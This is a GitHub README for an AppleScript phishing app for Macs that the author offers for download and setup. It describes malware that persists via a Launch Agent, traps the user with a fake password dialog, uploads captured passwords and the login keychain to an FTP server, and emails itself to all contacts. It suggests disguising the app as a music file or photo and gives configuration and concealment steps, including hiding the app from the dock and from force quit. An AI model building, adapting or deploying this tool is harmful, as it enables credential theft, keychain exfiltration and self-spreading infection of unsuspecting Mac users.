BenB116's Phishing App for Mac
==========================

**Use this tool at your own risk. Don't do anything illegal. I do not accept any responsibility for any damages or harm done. This is purely an educational endeavor (for me).**

This is a phishing app that I wrote. It is written in applescript, which is important because it shows that potentially harmful tools can be written using a simple language and relatively limited programming knowledge. It is small and works on macs, whose users often don't worry about malware on their computers. This makes the app more effective, especially when disguised as a music file or photo. 

###Here's what it does:

* It checks for a killswitch, then creates a hidden folder in the user's Public folder.
* It copies a duplicate app to the hidden folder and creates a Launch Agent (to make the app start on login).
* It prompts the user to enter their password into a dialog box. If the user doesn't enter it within 10 seconds, the script kills all user processes, making the user have to log out in order to use the computer.
![image](http://f.cl.ly/items/3E0x2P0l452W2B1p2T0m/Prompt.png)
* If the password is entered correctly, the script copies the user's username, password, date, WAN IP, and LAN IP to a text file in the hidden folder.
 ![image](http://cl.ly/KB3S/Screenshot%202012-10-16%20at%206.47.02%20AM.jpg)
* If the password is not entered correctly, it forces the user to try again.
* It uploads this file to an FTP server.
* It copies the user's login keychain into the same folder and uploads it to the same FTP server
* It sends an email to all of the user's contacts' emails with the app attached.

###Please feel free to test the script by doing the following:

If you don't want your app to upload the text file and the keychain to an FTP server, and you don't want to actually send the email, you can just download "[Ready To Use App](https://github.com/benb116/Gone-Phishing/blob/master/Ready%20To%20Use%20App.zip)" and unzip it.

If you do want to upload to an FTP server and/or send out the email, follow the steps below.

1. Copy "App.applescript", "Updater.applescript", "DK.applescript", and "icon.icns" to your computer.
2. Open 'App.applescript' and 'Updater.applescript' in AppleScript Editor and find the FTP command properties.
3. Replace the parts of the code in '<>' with your information. For example:
	
		set myuser to "<Username>"		set mypass to "<Password>"		set myserv to "<ftp address>"		set mypath to "</path/to/folder/>"
		
	becomes
	
		set myuser to "Benb116"		set mypass to "12345"		set myserv to "123.456.789.0"		set mypath to "/Desktop/Passwords/"4. Optional: in App.applescript, find the comment "--send theMessage." Remove the "--" to make this an actual command that will actually send out the email.5. Export "App.applescript", "Updater.applescript", and "DK.applescript" as **run-only** applications. 
	* "Updater.applescript" and "DK.applescript" **must** be made into apps named "Updater" and "DK" respectively. You can name "App.app" whatever you want.
	
6. Run the following Terminal commands **with each app**:

		defaults write <app path>/Contents/Info.plist 'NSUIElement' '1'
(this prevents a dock icon from appearing and also makes it impossible to force quit the app)
7. Add "icon.icns" to the resources folders of "App.app" and "Updater.app"
8. Copy Updater.app and DK.app to the resources folder of "App.app"

